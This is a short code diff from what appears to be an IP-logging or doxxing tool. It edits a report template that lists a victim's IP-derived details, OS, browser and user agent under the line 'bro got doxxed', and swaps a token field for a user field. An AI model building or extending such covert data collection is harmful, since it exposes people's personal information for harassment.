@@ -166,7 +166,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **PC Info 💻:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
-> **bro got doxxed :** `{token}`
+> **bro got doxxed :** `{user}`
 **User Agent:**
 ```
 {useragent}
